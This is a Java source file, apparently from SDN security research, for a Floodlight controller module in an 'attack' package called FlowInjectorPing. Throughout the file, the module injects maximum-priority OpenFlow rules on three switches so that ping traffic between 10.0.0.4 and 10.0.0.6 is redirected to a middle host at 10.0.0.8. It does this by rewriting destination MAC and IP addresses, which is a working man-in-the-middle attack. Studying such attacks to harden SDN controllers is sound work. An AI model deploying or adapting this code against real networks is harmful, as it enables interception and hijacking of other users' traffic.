package net.floodlightapp.attack;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import net.floodlightcontroller.core.FloodlightContext;
import net.floodlightcontroller.core.IOFSwitch;
import net.floodlightcontroller.core.module.FloodlightModuleContext;
import net.floodlightcontroller.core.module.FloodlightModuleException;
import net.floodlightcontroller.core.util.AppCookie;
import net.floodlightcontroller.devicemanager.IDevice;
import net.floodlightcontroller.devicemanager.IDeviceService;
import net.floodlightcontroller.packet.IPv4;
import net.floodlightcontroller.util.MACAddress;

import org.openflow.protocol.OFFlowMod;
import org.openflow.protocol.OFMatch;
import org.openflow.protocol.OFMessage;
import org.openflow.protocol.OFPacketIn;
import org.openflow.protocol.OFType;
import org.openflow.protocol.action.OFAction;
import org.openflow.protocol.action.OFActionDataLayer;
import org.openflow.protocol.action.OFActionDataLayerDestination;
import org.openflow.protocol.action.OFActionDataLayerSource;
import org.openflow.protocol.action.OFActionNetworkLayerAddress;
import org.openflow.protocol.action.OFActionNetworkLayerDestination;
import org.openflow.protocol.action.OFActionNetworkLayerSource;
import org.openflow.protocol.action.OFActionOutput;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * 
 * @author shichao
 *
 */
public class FlowInjectorPing extends PlayBase {

	public static final int FLOWINJECTION_APP_ID = 1128;
	public static final short IDLE_TO = 0;
	public static final short HARD_TO = 600;

	public static final short inport = (short) 3;
	public static final MACAddress MAC_MID = MACAddress
			.valueOf("16:8f:3e:e2:38:1c");
	public static final short DL_TYPE = (short) 0x0800;
	public static final short VLAN_ID = (short) 0xffff;
	public static final byte VLAN_PRIORITY = (byte) 0;
	public static final int IP_SRC = IPv4.toIPv4Address("10.0.0.4");
	public static final int IP_DST = IPv4.toIPv4Address("10.0.0.6");
	public static final int IP_MID = IPv4.toIPv4Address("10.0.0.8");
	public static final byte NW_TYPE = (byte) 1;
	public static final byte PORT_SRC = 0;
	public static final short PORT_DST = 0;

	public static Logger log = LoggerFactory.getLogger(FlowInjectorPing.class);

	@Override
	public String getName() {
		return "Flow Injector Ping";
	}

	@Override
	public net.floodlightcontroller.core.IListener.Command receive(
			IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
		log.info("Packet_In Message Received");
		return null;
	}

	@Override
	public void init(FloodlightModuleContext context)
			throws FloodlightModuleException {
		super.init(context);
	}

	@Override
	public void startUp(FloodlightModuleContext context) {
		super.startUp(context);
		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
		new Thread(new FlowInjectionRunnable()).start();
	}

	private void flowInjectReactive(OFPacketIn pi) {
		// deprecated for the moment
	}

	private void flowInjectProactive() {

		IOFSwitch s1 = floodlightProvider.getSwitches().get(1l);
		IOFSwitch s2 = floodlightProvider.getSwitches().get(2l);
		IOFSwitch s3 = floodlightProvider.getSwitches().get(3l);

		if (s1 == null || s2 == null || s3 == null) {
			log.error("Too fast, switch not discovered yet !");
			throw new NullPointerException();
		}

		/* Main part */
		OFMatch match = new OFMatch();
		// What match should contain:
		// (1) Inport not now
		// (2) DL_TYPE: to match against the IP header field, otherwise (3) will
		// not match. Also prevent ARP from being matched.
		// (3) SRC_IP, DST_IP
		// (4) NW_PROTO
		match.setDataLayerType(DL_TYPE).setNetworkSource(IP_SRC)
				.setNetworkDestination(IP_DST).setNetworkProtocol(NW_TYPE);

		match.setWildcards(OFMatch.OFPFW_ALL & ~OFMatch.OFPFW_IN_PORT
				& ~OFMatch.OFPFW_DL_TYPE & ~OFMatch.OFPFW_NW_DST_MASK
				& ~OFMatch.OFPFW_NW_SRC_MASK & ~OFMatch.OFPFW_NW_PROTO);

		long cookie = AppCookie.makeCookie(FLOWINJECTION_APP_ID, 0);

		/* Install flow */
		installFlow(s1, match, (short) 3, (short) 2, cookie);
		installFlow(s3, match, (short) 1, (short) 3, cookie);
		modifyDstAddress(s3, match, (short) 1, (short) 3, MAC_MID.toBytes(),
				IP_MID, cookie);

		// Same for another half-duplex
		match = new OFMatch();
		match.setDataLayerType(DL_TYPE).setNetworkSource(IP_DST)
				.setNetworkDestination(IP_SRC).setNetworkProtocol(NW_TYPE);
		match.setWildcards(OFMatch.OFPFW_ALL & ~OFMatch.OFPFW_IN_PORT
				& ~OFMatch.OFPFW_DL_TYPE & ~OFMatch.OFPFW_NW_DST_MASK
				& ~OFMatch.OFPFW_NW_SRC_MASK & ~OFMatch.OFPFW_NW_PROTO);

		installFlow(s2, match, (short) 3, (short) 2, cookie);
		installFlow(s3, match, (short) 2, (short) 3, cookie);
		modifyDstAddress(s3, match, (short) 2, (short) 3, MAC_MID.toBytes(),
				IP_MID, cookie);
	}

	

	private void modifyDstAddress(IOFSwitch sw, OFMatch match, short inport,
			short outport, byte[] mod_mac, int mod_ip, long cookie) {
		match.setInputPort(inport);

		List<OFAction> actions = new ArrayList<OFAction>();
		OFActionDataLayer dl_action = new OFActionDataLayerDestination(mod_mac);
		OFActionNetworkLayerAddress nw_action = new OFActionNetworkLayerDestination(
				mod_ip);
		OFActionOutput output_action = new OFActionOutput(outport,
				(short) 0Xffff);
		actions.add(dl_action);
		actions.add(nw_action);
		actions.add(output_action);

		OFFlowMod fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory()
				.getMessage(OFType.FLOW_MOD));
		fm.setCookie(cookie)
				.setCommand(OFFlowMod.OFPFC_MODIFY)
				.setMatch(match)
				.setActions(actions)
				.setLengthU(
						OFFlowMod.MINIMUM_LENGTH
								+ OFActionOutput.MINIMUM_LENGTH
								+ OFActionDataLayer.MINIMUM_LENGTH
								+ OFActionNetworkLayerAddress.MINIMUM_LENGTH);

		try {
			counterStore.updatePktOutFMCounterStore(sw, fm);
			messageDamper.write(sw, fm, new FloodlightContext());
			sw.flush();
		} catch (IOException e) {
			System.err.println("Error writing to the sw");
			e.printStackTrace();
		}

	}

	private void installFlow(IOFSwitch sw, OFMatch match, short inport,
			short outport, long cookie) {

		match.setInputPort(inport);

		List<OFAction> actions = new ArrayList<OFAction>();
		OFActionOutput output_action = new OFActionOutput(outport,
				(short) 0Xffff);
		actions.add(output_action);

		OFFlowMod fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory()
				.getMessage(OFType.FLOW_MOD));
		fm.setIdleTimeout(FlowInjectorPing.IDLE_TO)
				.setHardTimeout(FlowInjectorPing.HARD_TO)
				.setCookie(cookie)
				.setCommand(OFFlowMod.OFPFC_ADD)
				.setMatch(match)
				.setActions(actions)
				.setPriority(Short.MAX_VALUE)
				.setLengthU(
						OFFlowMod.MINIMUM_LENGTH
								+ OFActionOutput.MINIMUM_LENGTH);

		try {
			counterStore.updatePktOutFMCounterStore(sw, fm);
			messageDamper.write(sw, fm, new FloodlightContext());
			sw.flush();
		} catch (IOException e) {
			System.err.println("Error writing to the sw");
			e.printStackTrace();
		}
	}

	private class FlowInjectionRunnable implements Runnable {

		@Override
		public void run() {
			try {
				Thread.sleep(30000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			log.info("Will inject flow now");
			flowInjectProactive();
			log.info("Injection finished");
		}
	}

}
